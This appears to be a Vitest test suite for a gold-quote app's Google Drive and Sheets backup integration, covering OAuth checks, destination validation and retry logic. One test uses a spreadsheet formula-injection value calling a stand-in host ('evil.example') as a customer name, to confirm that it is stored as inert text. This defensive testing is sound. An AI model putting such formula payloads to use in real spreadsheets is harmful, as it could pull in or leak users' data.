import { describe, expect, it } from 'vitest';
import { Client, OWNER, addStaff, createQuote, deviceFor, env, reauth, send, setRate, setupOwner, staffDevice } from './helpers';
import { FakeGoogle } from './fake-google';
import { googleDeps } from '../src/worker/google/client';
import { runDueJobs, SHEET_HEADERS } from '../src/worker/google/sync';

const SHEET_URL = 'https://docs.google.com/spreadsheets/d/SpreadsheetAbcdefghijklmnop123/edit#gid=0';

async function startConnect(owner: Client) {
  await reauth(owner);
  const r = await owner.post('/google/connect');
  expect(r.status).toBe(200);
  const u = new URL(r.data.auth_url);
  return { url: u, state: u.searchParams.get('state')! };
}

async function callback(c: Client, params: Record<string, string>) {
  const r = await c.req('GET', `/google/callback?${new URLSearchParams(params)}`);
  expect(r.status).toBe(302);
  return r.headers.get('location')!;
}

async function connect(owner: Client, fake: FakeGoogle) {
  googleDeps.fetch = fake.fetch;
  const { state } = await startConnect(owner);
  expect(await callback(owner, { state, code: 'good-code' })).toBe('/settings/backups?google=connected');
}

async function connectWithDestinations(owner: Client, fake: FakeGoogle) {
  await connect(owner, fake);
  const folder = (await owner.post('/google/folder')).data;
  const r = await owner.post('/google/destinations', { folder: folder.link, spreadsheet: SHEET_URL, sheet: { new_title: 'Swarna Live Transactions' }, confirm_initialize: true });
  expect(r.status, JSON.stringify(r.data)).toBe(200);
  return folder;
}

const managedTab = (fake: FakeGoogle) => fake.sheets.get('SpreadsheetAbcdefghijklmnop123')!.tabs.find((t) => t.title === 'Swarna Live Transactions')!;

describe('Google OAuth', () => {
  it('builds an authorization request with state, PKCE, offline access and narrow scopes', async () => {
    const { owner } = await setupOwner();
    const { url } = await startConnect(owner);
    expect(url.origin + url.pathname).toBe('https://accounts.google.com/o/oauth2/v2/auth');
    expect(url.searchParams.get('code_challenge_method')).toBe('S256');
    expect(url.searchParams.get('code_challenge')).toMatch(/^[A-Za-z0-9_-]{43}$/);
    expect(url.searchParams.get('access_type')).toBe('offline');
    expect(url.searchParams.get('redirect_uri')).toBe('http://localhost:8787/api/google/callback');
    expect(url.searchParams.get('scope')!.split(' ')).toEqual(['openid', 'email', 'https://www.googleapis.com/auth/drive.file', 'https://www.googleapis.com/auth/spreadsheets']);
  });

  it('only the owner, after confirming the password, can start a connection', async () => {
    const { owner } = await setupOwner();
    await env.DB.prepare('UPDATE sessions SET reauth_at = 0').run();
    expect((await owner.post('/google/connect')).data.code).toBe('REAUTH_REQUIRED');
    const adminId = await addStaff(owner, 'Meena', 'admin', ['quotes.create', 'quotes.view_all', 'settings.business', 'audit.view']);
    const admin = await staffDevice(adminId);
    expect((await admin.post('/google/connect')).status).toBe(403);
    expect((await admin.get('/google/status')).status).toBe(403);
  });

  it('rejects bad, replayed, expired or cross-session callbacks', async () => {
    const { owner, ownerStaffId } = await setupOwner();
    const fake = new FakeGoogle();
    googleDeps.fetch = fake.fetch;
    expect(await callback(owner, { state: 'made-up', code: 'good-code' })).toContain('invalid_state');

    // another browser (even signed in to the same business) cannot finish someone else's flow
    const { state } = await startConnect(owner);
    const other = await deviceFor(OWNER.email, OWNER.password, ownerStaffId, OWNER.pin);
    expect(await callback(other, { state, code: 'good-code' })).toContain('session_mismatch');
    // the state was consumed, so it cannot be replayed
    expect(await callback(owner, { state, code: 'good-code' })).toContain('invalid_state');

    const s2 = (await startConnect(owner)).state;
    await env.DB.prepare('UPDATE oauth_states SET expires_at = 1').run();
    expect(await callback(owner, { state: s2, code: 'good-code' })).toContain('expired');

    const s3 = (await startConnect(owner)).state;
    expect(await callback(owner, { state: s3, error: 'access_denied' })).toContain('denied');
    expect((await owner.get('/google/status')).data.connection).toBeNull();
  });

  it('requires both Drive and Sheets permissions to be granted', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    fake.grantedScope = 'openid email https://www.googleapis.com/auth/drive.file';
    googleDeps.fetch = fake.fetch;
    const { state } = await startConnect(owner);
    expect(await callback(owner, { state, code: 'good-code' })).toContain('missing_permissions');
    expect(fake.revoked).toBe(true);
    expect((await owner.get('/google/status')).data.connection).toBeNull();
  });

  it('stores tokens encrypted and never returns them', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connect(owner, fake);
    const status = await owner.get('/google/status');
    expect(status.data.connection).toMatchObject({ status: 'connected', google_email: 'owner.backup@gmail.com' });
    const everything = JSON.stringify(status.data) + JSON.stringify((await env.DB.prepare('SELECT * FROM google_connections').all()).results)
      + JSON.stringify((await env.DB.prepare('SELECT * FROM audit_log').all()).results);
    expect(everything).not.toContain('refresh-token-secret');
    expect(everything).not.toContain('ya29.');
    expect(JSON.stringify(status.data)).not.toMatch(/token_enc/);
  });
});

describe('choosing destinations', () => {
  it('validates links, folder access and worksheet contents', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connect(owner, fake);
    await reauth(owner);
    const bad = await owner.post('/google/inspect', { folder: 'https://example.com/drive/folders/abc123456789' });
    expect(bad.status).toBe(400);
    // a folder Swarna Live did not create cannot be used with the drive.file permission
    const notOurs = await owner.post('/google/inspect', { folder: 'https://drive.google.com/drive/folders/UserOwnedFolder123' });
    expect(notOurs.status).toBe(422);
    expect(notOurs.data.code).toBe('GOOGLE_FOLDER_ACCESS');
    const missingSheet = await owner.post('/google/inspect', { spreadsheet: 'https://docs.google.com/spreadsheets/d/DoesNotExist0000000000000/edit' });
    expect(missingSheet.status).toBe(422);

    const folder = (await owner.post('/google/folder')).data;
    const ins = (await owner.post('/google/inspect', { folder: folder.link, spreadsheet: SHEET_URL })).data;
    expect(ins.folder.id).toBe(folder.id);
    expect(ins.spreadsheet.tabs).toEqual([{ sheet_id: 0, title: 'Sheet1', state: 'other' }, { sheet_id: 77, title: 'Empty tab', state: 'empty' }]);

    // never overwrite unrelated content
    const other = await owner.post('/google/destinations', { folder: folder.link, spreadsheet: SHEET_URL, sheet: { sheet_id: 0 }, confirm_initialize: true });
    expect(other.status).toBe(400);
    expect(fake.tab(0).rows).toEqual([['Existing', 'data', 'keep me']]);
    // empty tab needs explicit confirmation before it is initialised
    const noConfirm = await owner.post('/google/destinations', { folder: folder.link, spreadsheet: SHEET_URL, sheet: { sheet_id: 77 } });
    expect(noConfirm.data.code).toBe('CONFIRM_REQUIRED');
    expect(fake.tab(77).rows).toEqual([]);
    const ok = await owner.post('/google/destinations', { folder: folder.link, spreadsheet: SHEET_URL, sheet: { sheet_id: 77 }, confirm_initialize: true });
    expect(ok.status).toBe(200);
    expect(fake.tab(77).rows[0]).toEqual(SHEET_HEADERS);
    expect((await owner.post('/google/test')).data.ok).toBe(true);
  });
});

describe('synchronisation', () => {
  it('backs up the photo privately to Drive and a row to Sheets after a save', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    const q = (await createQuote(owner, { name: '=IMPORTXML("http://evil.example")', phone: '9848012345', gross: '10', deduction: '0' })).data.quote;

    const d = (await owner.get(`/quotes/${q.id}`)).data;
    expect(d.backup.map((j: { kind: string; status: string }) => `${j.kind}:${j.status}`).sort()).toEqual(['drive:synced', 'sheet:synced']);

    const photo = [...fake.files.values()].find((f) => f.appProperties.swarnaRecord === q.id)!;
    expect(photo.name).toContain(q.order_no);
    expect(photo.permissions).toEqual([]); // no public sharing
    const month = fake.files.get(photo.parents[0])!;
    const year = fake.files.get(month.parents[0])!;
    expect(year.name).toMatch(/^20\d\d$/);
    expect(month.name).toMatch(/^\d\d$/);

    const rows = managedTab(fake).rows;
    expect(rows).toHaveLength(2);
    const row = rows[1];
    expect(row[0]).toBe(q.order_no);
    expect(row[3]).toBe('=IMPORTXML("http://evil.example")'); // written RAW: stays text, never runs
    expect(row[4]).toBe('+919848012345');
    expect(typeof row[4]).toBe('string');
    expect(row[11]).toBe(10); // net weight, numeric
    expect(row[15]).toBe(39600); // offer, numeric
    expect(row[18]).toContain(photo.id); // Drive link added after upload
    expect(row[19]).toBe(q.id); // immutable record id
  });

  it('updates the same row when the status changes; retries never duplicate', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    const q = (await createQuote(owner)).data.quote;
    await owner.post(`/quotes/${q.id}/status`, { status: 'accepted', reason: 'Agreed' });
    let rows = managedTab(fake).rows;
    expect(rows).toHaveLength(2);
    expect(rows[1][16]).toBe('Accepted');

    // Simulate "uploaded but result not recorded" + "row written but row number lost", then retry.
    await env.DB.batch([
      env.DB.prepare("UPDATE sync_jobs SET drive_file_id = NULL, status = 'pending', version = version + 1, next_attempt_at = 0 WHERE kind = 'drive'"),
      env.DB.prepare("UPDATE sync_jobs SET sheet_row = NULL, status = 'pending', version = version + 1, next_attempt_at = 0 WHERE kind = 'sheet'"),
    ]);
    await runDueJobs(env, Date.now());
    expect(fake.uploads).toBe(1);
    rows = managedTab(fake).rows;
    expect(rows).toHaveLength(2);
  });

  it('retries transient Google errors with backoff, then succeeds', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    fake.failNext = { match: /sheets\.googleapis\.com.*append/, status: 503, times: 1 };
    const q = (await createQuote(owner)).data.quote;
    const job = await env.DB.prepare("SELECT * FROM sync_jobs WHERE quote_id = ? AND kind = 'sheet'").bind(q.id).first<{ status: string; attempts: number; next_attempt_at: number }>();
    expect(job).toMatchObject({ status: 'pending', attempts: 1 });
    expect(job!.next_attempt_at).toBeGreaterThan(Date.now());
    await env.DB.prepare('UPDATE sync_jobs SET next_attempt_at = 0').run(); // time passes
    await runDueJobs(env);
    expect((await owner.get(`/quotes/${q.id}`)).data.backup.every((j: { status: string }) => j.status === 'synced')).toBe(true);
    expect(managedTab(fake).rows).toHaveLength(2);
  });

  it('keeps saving in Cloudflare when Google is unreachable', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    googleDeps.fetch = async () => { throw new TypeError('network down'); };
    await env.DB.prepare('UPDATE google_connections SET access_expires_at = 0').run();
    const r = await createQuote(owner);
    expect(r.status).toBe(201);
    const jobs = (await owner.get(`/quotes/${r.data.quote.id}`)).data.backup;
    expect(jobs.every((j: { status: string }) => j.status === 'pending')).toBe(true);
    expect(jobs[0].last_error).toBe('Could not reach Google.');
  });

  it('handles revoked authorization: saves continue, backups pause, owner is told to reconnect', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    fake.revoked = true;
    await env.DB.prepare('UPDATE google_connections SET access_expires_at = 0').run();
    const r = await createQuote(owner);
    expect(r.status).toBe(201);
    const status = (await owner.get('/google/status')).data;
    expect(status.connection.status).toBe('reconnect_required');
    expect(status.counts.drive.paused).toBe(1);
    expect(status.counts.drive.synced).toBeUndefined();
  });

  it('disconnect revokes access, keeps files, and backfill after reconnecting fills the gap without duplicates', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    const first = (await createQuote(owner)).data.quote;
    expect(fake.uploads).toBe(1);

    await reauth(owner);
    expect((await owner.post('/google/disconnect')).status).toBe(200);
    expect(fake.revoked).toBe(true);
    expect(fake.files.size).toBeGreaterThan(1); // nothing deleted in Drive
    const second = (await createQuote(owner)).data.quote; // saved while disconnected
    let status = (await owner.get('/google/status')).data;
    expect(status.connection.status).toBe('disconnected');
    expect(status.not_backed_up).toBe(1);
    expect((await owner.get(`/quotes/${second.id}`)).data.backup).toEqual([]); // not marked as synced

    fake.revoked = false;
    const { state } = await startConnect(owner);
    expect(await callback(owner, { state, code: 'good-code' })).toContain('connected');
    // same Google account → destinations kept; nothing happens until the owner asks
    expect(fake.uploads).toBe(1);
    const bf = await owner.post('/google/backfill');
    expect(bf.status).toBe(200);
    await runDueJobs(env, Date.now() + 1000);
    status = (await owner.get('/google/status')).data;
    expect(status.not_backed_up).toBe(0);
    expect(fake.uploads).toBe(2);
    expect(managedTab(fake).rows.map((r) => r[19]).slice(1).sort()).toEqual([first.id, second.id].sort());
  });

  it('a destination change only affects future backups', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    const folder = await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    const old = (await createQuote(owner)).data.quote;
    await reauth(owner);
    expect((await owner.post('/google/destinations', { folder: folder.link, spreadsheet: SHEET_URL, sheet: { sheet_id: 77 }, confirm_initialize: true })).status).toBe(200);
    const fresh = (await createQuote(owner)).data.quote;
    await owner.post(`/quotes/${old.id}/status`, { status: 'cancelled', reason: 'Customer left' });
    const oldTab = managedTab(fake).rows;
    expect(oldTab).toHaveLength(2);
    expect(oldTab[1][16]).toBe('Cancelled'); // old record updated where it lives
    expect(fake.tab(77).rows.map((r) => r[19])).toEqual([SHEET_HEADERS[19], fresh.id]);
  });

  it('owner-only manual retry of failed backups', async () => {
    const { owner } = await setupOwner();
    const fake = new FakeGoogle();
    await connectWithDestinations(owner, fake);
    await setRate(owner, 'gold', '7200');
    // the worksheet is deleted → permanent failure, owner must act
    const tab = managedTab(fake);
    fake.sheets.get('SpreadsheetAbcdefghijklmnop123')!.tabs = fake.sheets.get('SpreadsheetAbcdefghijklmnop123')!.tabs.filter((t) => t !== tab);
    const q = (await createQuote(owner)).data.quote;
    const sheetJob = (await owner.get(`/quotes/${q.id}`)).data.backup.find((j: { kind: string }) => j.kind === 'sheet');
    expect(sheetJob.status).toBe('failed');
    expect(sheetJob.last_error).toContain('worksheet was deleted');
    // restore and retry
    fake.sheets.get('SpreadsheetAbcdefghijklmnop123')!.tabs.push(tab);
    const empId = await addStaff(owner, 'Arjun', 'employee');
    const emp = await staffDevice(empId);
    expect((await emp.post('/google/retry')).status).toBe(403);
    expect((await owner.post('/google/retry')).data.retried).toBe(1);
    expect((await owner.get(`/quotes/${q.id}`)).data.backup.every((j: { status: string }) => j.status === 'synced')).toBe(true);
    void send;
  });
});
